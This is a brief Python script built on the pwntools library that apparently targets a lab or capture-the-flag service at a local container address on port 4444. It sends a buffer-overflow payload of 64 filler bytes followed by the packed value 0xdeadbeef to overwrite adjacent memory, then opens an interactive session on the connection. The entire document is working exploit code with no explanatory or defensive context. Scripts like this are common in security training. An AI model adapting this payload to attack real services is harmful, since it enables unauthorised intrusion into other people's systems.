#!/usr/bin/env python3

from pwn import *

proc = remote("172.17.0.2", 4444)

payload = b"A"*64
payload += p32(0xdeadbeef)

proc.sendline(payload)
proc.interactive()
